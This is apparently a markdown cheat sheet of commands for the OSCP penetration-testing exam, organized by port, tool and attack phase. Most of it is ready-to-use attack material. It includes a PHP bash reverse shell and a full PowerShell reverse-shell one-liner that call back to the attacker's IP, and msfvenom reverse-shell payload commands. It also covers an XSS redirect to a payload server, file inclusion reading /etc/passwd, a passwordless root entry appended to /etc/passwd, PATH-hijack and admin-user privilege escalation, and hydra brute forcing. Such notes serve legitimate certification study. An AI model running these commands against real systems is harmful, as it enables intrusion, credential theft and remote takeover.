# Useful OSCP Commands
The document below contains a list of useful OSCP commands, split into the following sections: 

- Ports and Operations
- Netcat
- Nmap
- Samba
- RDP
- cURL
- File Transfer (Windows)
- Password Cracking
- Privilege Escalation: Windows
- Privilege Escalation: Unix
- Client Side attacks
- Web attacks
- MSFVenom
- Linux Miscellaneous Commands
- Windows Miscellaneous Commands
- Kali Linux SearchSploit
- Miscellaneous Github Links

## PORTS AND OPERATIONS

- **21 : FTP**
	- ```ftp <ip>```  
	(username: anonymous, password: anonymous): See if anonymous login is possible
	- Linux (SearchSploit): `exploit/linux/ftp/proftp_telnet_iac`
	- Windows x86: exploit-db/16731
- **22 : SSH**
	- ```ssh <ip>```  
	See if you can get some info from SSH header
	- Possible ssh-dss exploit - look at the ssh public key for the algorithm used and look at the g0tmilk link referenced below
- ***25: SMTP***
	- `VRFY`
- ***80/443/8080: HTTP/S***
	- Nikto: scan for files, shellshock vuln
	- Dirb: directory listing ```dirb http://<ip>```
	- Everytime you find a new directory through non-dirb methods, remember to enumerate again so you don’t miss anything!
- ***139/445 : SMB***
	- `enum4linux -a <ip>`  
	Displays all info
	- `smbmap -u "" -p "" -d <domain> -H <ip>`  
	- lists samba shares and permissions
	`smbclient \\\\<domain>\\<share> -I <ip> -U “”`  
	Look for SMB exploits [symlink, ]
	Passwords, ssh keys, backups
	GET files out
	- Smb versions lesser than 2.2.8 are susceptible to  
	linux/bsd: exploit-db/10
	- Win 2008  
	msf: ms09_050_smb2_negotiate_func_index 
	- XXXX: msrpc  
	Win XP/2000: exploit-db/66  
	Other Win OS: exploit-db/16323

## NETCAT
- ```nc -nlvp 4444```  
	listen on port 4444
- ```nc -nlvp 4444 > <filename>```  
listen for file and write to <filename>
- ```nc -nv <ip> <port> < <filename>```	 
transfer file to <ip> <port>
- ```nc -nvlp 4444 -e <cmd>```  
listens on port and runs <cmd> when something connects
- ```nc <ip> 80```  
if a webserver is running on the ip, this can be used to connect to get server version, etc

## NMAP
- `nmap -sS <ip>`  
	Basic Scan
- `nmap -p- -A <ip>`  
	Scans all ports, vulnerabilities, version number, OS identification
- `nmap --script=vuln <ip>`  
	Vulnerable Port Scan
- `nmap -sU <ip>`  
UDP scan
- `nmap -O <ip>`  
OS Version
- `nmap -sV -Pn -p- -iL <list-of-IPs> --script=vuln -su123`  
Runs a scan on a list of IPs on all ports without pinging the server. Runs a vulerability + version scan. 

## SAMBA
- SMB1: 2000, XP & 2003
```enum4linux -a <ip>```
- SMB2: Vista SP1 & 2008
- SMB2.1: 7 &2008 R2
- SMB3: 8 & 2012
- Listing of shares ```smbmap -H <target ip> -u "" -p ""```

## REMOTE DESKTOP
- `rdesktop <ip>`

## CURL
- ```curl -i <ip>```  
Get request banner info
- ```curl -i -L <ip>```  
request/response

## FILE TRANSFER (WINDOWS)
- Pure ftp-d: Page 202 of PWK Manual
- Powershell:  
```Invoke-WebRequest -Uri <url> -OutFile <filename.ext>```

## PASSWORD CRACKING
- Hashcat:  
	`hashcat -m <hashtype> hash.txt /usr/share/wordlists/rockyou.txt` 
	hashtypes: https://hashcat.net/wiki/doku.php?id=example_hashes
- john the ripper is an alternative tool

## PRIVILEGE ESCALATION: WINDOWS
- Windows priv checker: https://github.com/pentestmonkey/windows-privesc-check
https://github.com/rasta-mouse/Watson 
- Adding a new user:   
`net user test 1234 /add`  
`net localgroup administrators test /add` 
- Run ```sc query``` to check services and paths. 
Are there any paths that are not enclosed in `“ ”`?  
If so, https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
- Are there any programs that are running as root but can be edited?  
http://www.fuzzysecurity.com/tutorials/16.html (- Δt for t7 to t10 - Roll Up Your Sleeves - you might have to remove the dependencies)
- Windows server 2003?  
churrasco.bin: https://simonuvarov.com/privilege-escalation-via-token-kidnapping/ 
- Compiling python exploits for Windows:
	- Use pyinstaller:  
	```pip install pyinstaller```  
	```pyinstaller <exploit.py>```
	- It will generate a folder called build in the same directory
	- Transfer all the files within the build folder to the target machine and execute the exe
	- ENSURE that the version of python/pyinstaller being used matches the version required by the script
	Note: This method can also be used to compile python exploits to run on linux machines without a compatible python installation

## PRIVILEGE ESCALATION: UNIX
- Linuxprivchecker:  
https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py
- `cat /etc/shadow`  
Can the passwords be read/bruteforced? If yes, use hashcat!
- `ls -al /etc/passwd`  
Is it possible to write to this file? If so, overwrite root and set an empty password using the following command:  
`echo “test::0:0::/home/jc:/bin/sh” >> /etc/passwd`
- `id`  
is id > 1000?  
Try sudo su - you might be in the sudoers file!
- What are the processes running?  
```ps -aux```
- Checks for files set with the suid bit - programs that run as root but can be started by anyone. The following commands will lead to privilege escalation:
	- Find the files with the suid bit:  
	```find / -perm -g=s -o -perm -u=s -type f 2>/dev/null```
	- Use `strings <program name>` to see what the program did
	- Check for commands running without full file path [scp, ]
	- Add `tmp` to `PATH`, create a file with `bash/sh` and call command  
	`export PATH=”/tmp”:$PATH (adds it to the start so linux checks tmp first)`
	- in `/tmp`   
	`echo “/bin/bash” > scp` (or /bin/sh)  
	(here scp is the command not being run with full path)
	- `chmod +x scp`
	- Run the program: `<program name>`  
	(It will find your version of “scp” first, and run it as root)
- Can’t write to /tmp? Use the following command to find writable directories in the filesystem
```find / -writable -type d 2>/dev/null```
- Getting the error “su must be run from terminal” when trying to run sudo su? Run the following command, and then call `python asdf.py` to get a terminal  
```echo "import pty; pty.spawn('/bin/bash')" > asdf.```
- If your unix distribution is BSD- then the commands are not the same as linux
	- fetch is the equivalent of wget 
- DIRTYCOW
	- If you see linux version > 2.6.22 and < 3.9, chances are, it might be vulnerable to dirtycow. Best working exploit: https://www.exploit-db.com/exploits/40839 
	- You might have to close and reopen shell to get it to work tho. Then you can su firefart
- Limited shells
	- Lshell: breakout by using `echo && bash` or `echo || bash`  
	(if bash doesnt work, try sh)
	- If the above fails try those in the link: https://netsec.ws/?p=337 
	- Rbash: https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells 
	- `nmap --interactive` 
- SQL login with root and “” as password
	- If you can login to the mysql database with root and empty password- mysql -u root -p then you can execute commands that run as root: https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/ 

## CLIENT SIDE ATTACKS
- MS12-037: Metasploit browser autopwn2: 
	- Lets you run a server that hosts different attack payloads.
	- set `SRVHOST=<your IP>, SRVPORT=80` (remember to stop apache)
	- Embed the url of the server in a page vulnerable to XSS:  
	`<script> window.location.href=”your url”</script>`
	- You will get a reverse shell when the victim acesses the URL
- Java signed applet attack
- To brute force passwords use the wordlists under: `/use/share/wordlists`  
`hydra -l root -p pwfile.txt <ip> ssh`

## WEB ATTACKS
- Local file inclusion  
`<url>../../../../../../etc/passwd%00`
- Is the application being run as root? Can you read /etc/shadow? > Crack passwords found!
- Simple PHP reverse shell:
Sometimes php web applications allow php files to be uploaded or included in an RFI attack
Use this php shell:  
```<?php shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/<YOUR IP>/<YOUR LISTENER PORT> 0>&1```
- Shellshock  
If cgi-bin exists, https://www.exploit-db.com/exploits/34900/ 
- Remote file inclusion. Access the following URLs:    
`<target-host>/<hosted file>`  
`<target-host>/<hosted file>?`   
(sometimes your file has to have an escape character behind it, so try different things- `?` is most common)
- Remember to save your hosted file as .txt so it doesn’t get executed on your own end (this will give you a reverse shell to yourself)
- If the application is running as root, can you make the application run your code as root? 
- Wordpress: Check if Wp-login exists
```wpscan -u <URL>```
```wpscan --url <URL> --wordlist <rockyou.txt full path> --username admin```
- Powershell Reverse Shell:
```powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('<YOUR IP>',<YOUR PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"```

#MSFVENOM
- ASP  
`msfvenom -p windows/shell_reverse_tcp  LHOST=<Your IP> LPORT=<Your port> -f asp > shellBT.asp`
- PHP  
`msfvenom -p php/shell_reverse_tcp LHOST=<Your IP> LPORT=<Your port> -f raw > shellBT.php`
- EXE  
`msfvenom -p windows/shell_reverse_tcp LHOST=<Your IP> LPORT=<Your port> -f exe > shell.exe`
- For a full list please refer to the following link:  
https://superuser-ltd.github.io/2017/msfvenom-payloads/

## LINUX MISC COMMANDS
- `<command> &`  
Makes the command run in the background

## WINDOWS MISC COMMANDS
- Unzip Files in PS:  
`Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory("<pathtofile.zip>", "<outpath>")
PsExec: can be used to run commands as other users`

## KALI LINUX SEARCHSPLOIT
Searching for exploits in Kali Linux: On the terminal, type:  
```searchsploit <exploit want to search for>```


## MISCELLANEOUS LINKS:
- https://github.com/411Hall/JAWS 
- https://github.com/lukechilds/reverse-shell 
- https://github.com/abatchy17/WindowsExploits 
- https://github.com/warner/magic-wormhole 
- http://digitalforensicstips.com/2016/09/a-script-to-help-automate-windows-enumeration-for-privilege-escalation/ 
- https://sushant747.gitbooks.io/total-oscp-guide/content/port_forwarding_and_tunneling.html 
- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ 
- http://www.fuzzysecurity.com/tutorials/16.html 
- https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/ 
- http://justpentest.blogspot.sg/2015/07/minishare1.4.1-bufferoverflow.html 
- https://support.offensive-security.com/#!oscp-exam-guide.md 